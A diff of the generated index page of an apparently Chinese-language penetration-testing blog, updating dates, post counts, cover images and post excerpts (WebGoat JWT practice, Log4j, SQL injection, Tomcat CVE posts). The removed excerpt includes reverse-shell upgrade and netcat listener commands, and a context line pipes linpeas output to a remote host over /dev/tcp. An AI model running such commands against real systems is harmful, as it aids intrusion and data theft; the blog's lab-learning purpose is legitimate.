@@ -46,8 +46,8 @@
   />
   <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
   <meta property="article:author" content="L" />
-  <meta property="article:published_time" content="2026-04-24T00:00:00&#43;00:00" />
-  <meta property="article:modified_time" content="2026-04-24T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" /><link rel="alternate" type="application/rss+xml" href="https://test692618.github.io/index.xml" title="HELLO WORLD">
+  <meta property="article:published_time" content="2026-05-06T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-05-06T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" /><link rel="alternate" type="application/rss+xml" href="https://test692618.github.io/index.xml" title="HELLO WORLD">
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.abc397b347f937380734b44bf4d20f195146ec63edf7d6b881124b192e152126.css" /><link
     rel="preload"
     as="style"
@@ -143,7 +143,7 @@
 
         selectOptions.forEach((item) => {
           item.addEventListener("click", () => {
-            const langMap = {};langMap['zh-tw'] = '\/zh-tw\/';langMap['en'] = '\/en\/';langMap['ja'] = '\/ja\/';selectedLang.textContent = item.textContent;
+            const langMap = {};langMap['ja'] = '\/ja\/';langMap['zh-tw'] = '\/zh-tw\/';langMap['en'] = '\/en\/';selectedLang.textContent = item.textContent;
             selectItems.classList.remove("show");
             selectOptions.forEach((option) => {
               option.classList.remove("selected");
@@ -195,7 +195,7 @@
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">83</div>
+    <div>文章</div><div class="sidebar-state-number">84</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
@@ -518,6 +518,8 @@
       <h3 class="widget-title">最新文章</h3>
       <div class="widget">
         <ul><li>
+              <a href="/post/ad%E5%9F%9F/%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1/" title="内网通信">内网通信</a>
+            </li><li>
               <a href="/post/ad%E5%9F%9F/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" title="域渗透实战">域渗透实战</a>
             </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-base/" title="htb-Base">htb-Base</a>
@@ -525,8 +527,6 @@
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-markup/" title="htb-Markup">htb-Markup</a>
             </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-included/" title="htb-Included">htb-Included</a>
-            </li><li>
-              <a href="/post/htb/htb%E6%89%93%E9%9D%B6-unified/" title="htb-Unified">htb-Unified</a>
             </li></ul>
       </div>
     </div>
@@ -539,16 +539,60 @@
     data-aos="fade-up"
   ><a
         class="post-link"
-        href="/post/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/jwt%E6%BC%8F%E6%B4%9E/"
-        aria-label="jwt漏洞"
-        title="jwt漏洞"
+        href="/post/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/jwt%E6%BC%8F%E6%B4%9E-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"
+        aria-label="jwt靶场练习"
+        title="jwt靶场练习"
       >
       </a><div
       class="
         post-cover left
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg8.webp"
+            data-sizes="auto"
+            alt="jwt靶场练习"
+            class="lazyload"
+          /></div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span
+          ><span class="icon-calendar"></span
+          >2024-01-30</span
+        ><span
+          ><span class="icon-pencil"></span
+          >1291 字</span
+        >
+        <span
+          ><span class="icon-clock"></span
+          >3 分钟</span
+        >
+      </div>
+      <h2 class="post-title">jwt靶场练习</h2>
+      <article class="post-article">靶场名称：WebGoat
+敏感信息泻露 token中的payload部分采用base64URL编码，若设置了敏感信息，可以之间解码获取。
+解码后发现user账户
+</article>
+    </div>
+  </div>
+</div>
+<div class="post-wrapper">
+  <div
+    class="
+      post-wrap right
+    "
+    data-aos="fade-up"
+  ><a
+        class="post-link"
+        href="/post/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/jwt%E6%BC%8F%E6%B4%9E/"
+        aria-label="jwt漏洞"
+        title="jwt漏洞"
+      >
+      </a><div
+      class="
+        post-cover right
+      "
+    ><img
+            data-src="https://d-sketon.top/img/_backwebp/bg23.webp"
             data-sizes="auto"
             alt="jwt漏洞"
             class="lazyload"
@@ -577,7 +621,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -588,10 +632,10 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg8.webp"
             data-sizes="auto"
             alt="redis服务"
             class="lazyload"
@@ -618,7 +662,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -629,10 +673,10 @@
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg14.webp"
             data-sizes="auto"
             alt="Apache Log4j™ 2 -rce(CVE-2021-44228)"
             class="lazyload"
@@ -659,7 +703,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -670,10 +714,10 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg26.webp"
             data-sizes="auto"
             alt="SQL注入"
             class="lazyload"
@@ -701,7 +745,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -712,10 +756,10 @@
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg17.webp"
             data-sizes="auto"
             alt="Tomcat 文件读取包含漏洞 (cve-2020-1938)"
             class="lazyload"
@@ -744,7 +788,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -755,10 +799,10 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg24.webp"
             data-sizes="auto"
             alt="FTP端口测试"
             class="lazyload"
@@ -785,7 +829,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -796,10 +840,10 @@
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg3.webp"
             data-sizes="auto"
             alt="RPC端口测试"
             class="lazyload"
@@ -829,7 +873,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -840,7 +884,7 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -875,7 +919,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -886,10 +930,10 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-src="https://d-sketon.top/img/_backwebp/bg28.webp"
             data-sizes="auto"
             alt="其他技巧"
             class="lazyload"
@@ -913,47 +957,6 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 碰到cms先去找管理路径，尝试默认账户登录，其次去找通用漏洞。
 从网站配置获取的数据库密码还是从其他地方获取的账户密码，要进行统一收集，因为存在密码账户重复使用的情况。
 </article>
-    </div>
-  </div>
-</div>
-<div class="post-wrapper">
-  <div
-    class="
-      post-wrap right
-    "
-    data-aos="fade-up"
-  ><a
-        class="post-link"
-        href="/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E6%8F%90%E9%AB%98%E5%8F%8D%E5%BC%B9shell%E4%BA%A4%E4%BA%92%E6%80%A7/"
-        aria-label="提高反弹shell交互性"
-        title="提高反弹shell交互性"
-      >
-      </a><div
-      class="
-        post-cover right
-      "
-    ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
-            data-sizes="auto"
-            alt="提高反弹shell交互性"
-            class="lazyload"
-          /></div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span
-          ><span class="icon-calendar"></span
-          >2024-01-28</span
-        ><span
-          ><span class="icon-pencil"></span
-          >112 字</span
-        >
-        <span
-          ><span class="icon-clock"></span
-          >1 分钟</span
-        >
-      </div>
-      <h2 class="post-title">提高反弹shell交互性</h2>
-      <article class="post-article"> 使用python提升shell交互 Python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 重新输出shell 获得初始shell ctrl+z 挂在后台 然后输入 stty raw -echo;fg ## 这样再按ctrl+c时shell不会中断 添加环境变量 export TERM=xterm-color ## 可支持更多命令 使用rlwrap进行监听 rlwrap nc -lvvp 666 ## 可识别上下左右 </article>
     </div>
   </div>
 </div>
@@ -983,10 +986,10 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;88.7k</span
+          >&nbsp;89.8k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:41</span>
+        <span class="icon-coffee">&nbsp;03:44</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -1020,7 +1023,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">83</div>
+    <div>文章</div><div class="sidebar-state-number">84</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
